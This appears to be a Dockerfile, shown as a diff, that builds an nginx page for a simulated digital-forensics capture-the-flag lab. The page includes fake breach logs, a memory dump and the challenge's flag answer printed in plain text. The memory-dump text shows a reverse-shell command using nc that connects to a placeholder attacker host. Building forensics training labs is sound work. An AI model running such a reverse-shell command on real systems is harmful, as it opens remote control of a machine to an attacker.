@@ -1,0 +1,141 @@
+FROM nginx:alpine
+
+# Create forensics challenge
+RUN echo '<!DOCTYPE html>' > /usr/share/nginx/html/index.html && \
+    echo '<html><head><title>Digital Forensics</title>' >> /usr/share/nginx/html/index.html && \
+    echo '<style>' >> /usr/share/nginx/html/index.html && \
+    echo 'body { background: #0a0e27; color: #00ff41; font-family: monospace; padding: 30px; }' >> /usr/share/nginx/html/index.html && \
+    echo 'button { background: #00ff41; color: #0a0e27; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; }' >> /usr/share/nginx/html/index.html && \
+    echo 'pre { background: #1a1a2e; padding: 15px; border: 1px solid #00f5ff; overflow-x: auto; font-size: 11px; }' >> /usr/share/nginx/html/index.html && \
+    echo '.file { border: 1px solid #00f5ff; padding: 10px; margin: 10px 0; cursor: pointer; }' >> /usr/share/nginx/html/index.html && \
+    echo '.file:hover { background: #1a1a2e; }' >> /usr/share/nginx/html/index.html && \
+    echo 'input { background: #1a1a2e; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 300px; }' >> /usr/share/nginx/html/index.html && \
+    echo '</style></head><body>' >> /usr/share/nginx/html/index.html && \
+    echo '<h1>🔬 DIGITAL FORENSICS CHALLENGE</h1>' >> /usr/share/nginx/html/index.html && \
+    echo '<p>Analyze the compromised system to find evidence of the breach!</p>' >> /usr/share/nginx/html/index.html && \
+    echo '<h3>📁 Evidence Files:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '<button onclick="showFiles()">List Files</button>' >> /usr/share/nginx/html/index.html && \
+    echo '<button onclick="checkLogs()">Analyze Logs</button>' >> /usr/share/nginx/html/index.html && \
+    echo '<button onclick="examineMemory()">Memory Dump</button>' >> /usr/share/nginx/html/index.html && \
+    echo '<button onclick="findDeleted()">Recover Deleted Files</button>' >> /usr/share/nginx/html/index.html && \
+    echo '<div id="output"></div>' >> /usr/share/nginx/html/index.html && \
+    echo '<hr>' >> /usr/share/nginx/html/index.html && \
+    echo '<h3>🎯 Submit Flag:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '<input id="flag" placeholder="Enter the flag you discovered">' >> /usr/share/nginx/html/index.html && \
+    echo '<button onclick="submitFlag()">Submit</button>' >> /usr/share/nginx/html/index.html && \
+    echo '<div id="result"></div>' >> /usr/share/nginx/html/index.html && \
+    echo '<hr><h3>💡 Forensics Techniques:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '<ul>' >> /usr/share/nginx/html/index.html && \
+    echo '<li>Timeline analysis</li>' >> /usr/share/nginx/html/index.html && \
+    echo '<li>Log file examination</li>' >> /usr/share/nginx/html/index.html && \
+    echo '<li>File carving and recovery</li>' >> /usr/share/nginx/html/index.html && \
+    echo '<li>Memory forensics</li>' >> /usr/share/nginx/html/index.html && \
+    echo '<li>Hash verification</li>' >> /usr/share/nginx/html/index.html && \
+    echo '</ul>' >> /usr/share/nginx/html/index.html && \
+    echo '<script>' >> /usr/share/nginx/html/index.html && \
+    echo 'function showFiles() {' >> /usr/share/nginx/html/index.html && \
+    echo '  document.getElementById("output").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '    <h3>File System:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '    <pre>' >> /usr/share/nginx/html/index.html && \
+    echo '/var/log/' >> /usr/share/nginx/html/index.html && \
+    echo '├── auth.log (354 KB)' >> /usr/share/nginx/html/index.html && \
+    echo '├── syslog (1.2 MB)' >> /usr/share/nginx/html/index.html && \
+    echo '├── apache2/access.log (890 KB)' >> /usr/share/nginx/html/index.html && \
+    echo '└── suspicious.log (12 KB) ⚠️' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo '/home/user/' >> /usr/share/nginx/html/index.html && \
+    echo '├── .bash_history' >> /usr/share/nginx/html/index.html && \
+    echo '├── documents/' >> /usr/share/nginx/html/index.html && \
+    echo '└── .deleted_files/ (hidden) 🔍' >> /usr/share/nginx/html/index.html && \
+    echo '    </pre>' >> /usr/share/nginx/html/index.html && \
+    echo '    <p style="color: #00f5ff;">💡 suspicious.log and .deleted_files look interesting!</p>' >> /usr/share/nginx/html/index.html && \
+    echo '  `;' >> /usr/share/nginx/html/index.html && \
+    echo '}' >> /usr/share/nginx/html/index.html && \
+    echo 'function checkLogs() {' >> /usr/share/nginx/html/index.html && \
+    echo '  document.getElementById("output").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '    <h3>/var/log/suspicious.log:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '    <pre>' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:42:18] Unauthorized access attempt from 192.168.1.100' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:42:45] Root login successful' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:43:12] File created: /tmp/.backdoor.sh' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:43:45] Outbound connection to suspicious-server.com' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:44:20] Data exfiltration detected: 250 MB' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:44:55] Log tampering attempt detected' >> /usr/share/nginx/html/index.html && \
+    echo '[2026-02-13 03:45:30] Files deleted from /home/user/.secrets/' >> /usr/share/nginx/html/index.html && \
+    echo '    </pre>' >> /usr/share/nginx/html/index.html && \
+    echo '    <p style="color: #ff006e;">⚠️ Clear evidence of breach! Check deleted files.</p>' >> /usr/share/nginx/html/index.html && \
+    echo '  `;' >> /usr/share/nginx/html/index.html && \
+    echo '}' >> /usr/share/nginx/html/index.html && \
+    echo 'function examineMemory() {' >> /usr/share/nginx/html/index.html && \
+    echo '  document.getElementById("output").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '    <h3>Memory Dump Analysis:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '    <pre>' >> /usr/share/nginx/html/index.html && \
+    echo 'Process ID: 1337' >> /usr/share/nginx/html/index.html && \
+    echo 'Name: backdoor.sh' >> /usr/share/nginx/html/index.html && \
+    echo 'User: root' >> /usr/share/nginx/html/index.html && \
+    echo 'Command: nc -e /bin/bash suspicious-server.com 4444' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Network Connections:' >> /usr/share/nginx/html/index.html && \
+    echo 'ESTABLISHED 192.168.1.50:35478 → 45.33.32.156:4444' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Strings in memory:' >> /usr/share/nginx/html/index.html && \
+    echo '"Exfiltrating data..."' >> /usr/share/nginx/html/index.html && \
+    echo '"Connection established"' >> /usr/share/nginx/html/index.html && \
+    echo '"Flag stored in: /home/user/.deleted_files/secret.txt"' >> /usr/share/nginx/html/index.html && \
+    echo '    </pre>' >> /usr/share/nginx/html/index.html && \
+    echo '  `;' >> /usr/share/nginx/html/index.html && \
+    echo '}' >> /usr/share/nginx/html/index.html && \
+    echo 'function findDeleted() {' >> /usr/share/nginx/html/index.html && \
+    echo '  document.getElementById("output").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '    <h3>Recovered Deleted Files:</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '    <pre>' >> /usr/share/nginx/html/index.html && \
+    echo 'Scanning for deleted files...' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Found: /home/user/.deleted_files/secret.txt (deleted 2 hours ago)' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Recovering file...' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo '--- Content of secret.txt ---' >> /usr/share/nginx/html/index.html && \
+    echo 'CONFIDENTIAL BREACH EVIDENCE' >> /usr/share/nginx/html/index.html && \
+    echo 'Attacker IP: 192.168.1.100' >> /usr/share/nginx/html/index.html && \
+    echo 'Method: Exploited CVE-2024-1234' >> /usr/share/nginx/html/index.html && \
+    echo 'Backdoor: /tmp/.backdoor.sh' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Investigation Flag: CTF{f0r3ns1cs_3xp3rt}' >> /usr/share/nginx/html/index.html && \
+    echo '    </pre>' >> /usr/share/nginx/html/index.html && \
+    echo '    <p style="color: #00ff41;">✅ Flag recovered from deleted files!</p>' >> /usr/share/nginx/html/index.html && \
+    echo '  `;' >> /usr/share/nginx/html/index.html && \
+    echo '}' >> /usr/share/nginx/html/index.html && \
+    echo 'function submitFlag() {' >> /usr/share/nginx/html/index.html && \
+    echo '  const input = document.getElementById("flag").value;' >> /usr/share/nginx/html/index.html && \
+    echo '  if (input === "CTF{f0r3ns1cs_3xp3rt}") {' >> /usr/share/nginx/html/index.html && \
+    echo '    document.getElementById("result").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '      <h3 style="color: #00ff41;">✅ Correct Flag!</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '      <pre>' >> /usr/share/nginx/html/index.html && \
+    echo '🎉 Forensic Analysis Complete!' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Evidence collected:' >> /usr/share/nginx/html/index.html && \
+    echo '✓ Attacker IP identified' >> /usr/share/nginx/html/index.html && \
+    echo '✓ Backdoor located' >> /usr/share/nginx/html/index.html && \
+    echo '✓ Data exfiltration confirmed' >> /usr/share/nginx/html/index.html && \
+    echo '✓ Deleted files recovered' >> /usr/share/nginx/html/index.html && \
+    echo '' >> /usr/share/nginx/html/index.html && \
+    echo 'Excellent forensics work!' >> /usr/share/nginx/html/index.html && \
+    echo '      </pre>' >> /usr/share/nginx/html/index.html && \
+    echo '    `;' >> /usr/share/nginx/html/index.html && \
+    echo '  } else {' >> /usr/share/nginx/html/index.html && \
+    echo '    document.getElementById("result").innerHTML = `' >> /usr/share/nginx/html/index.html && \
+    echo '      <h3 style="color: #ff006e;">❌ Incorrect Flag</h3>' >> /usr/share/nginx/html/index.html && \
+    echo '      <p>Continue your investigation...</p>' >> /usr/share/nginx/html/index.html && \
+    echo '    `;' >> /usr/share/nginx/html/index.html && \
+    echo '  }' >> /usr/share/nginx/html/index.html && \
+    echo '}' >> /usr/share/nginx/html/index.html && \
+    echo '</script>' >> /usr/share/nginx/html/index.html && \
+    echo '</body></html>' >> /usr/share/nginx/html/index.html
+
+EXPOSE 80
+
+CMD ["nginx", "-g", "daemon off;"]
+
+# Build: docker build -t cyberlab/15-forensics:v1 -f Dockerfile.15-forensics .
+# Run: docker run -p 8015:80 cyberlab/15-forensics:v1
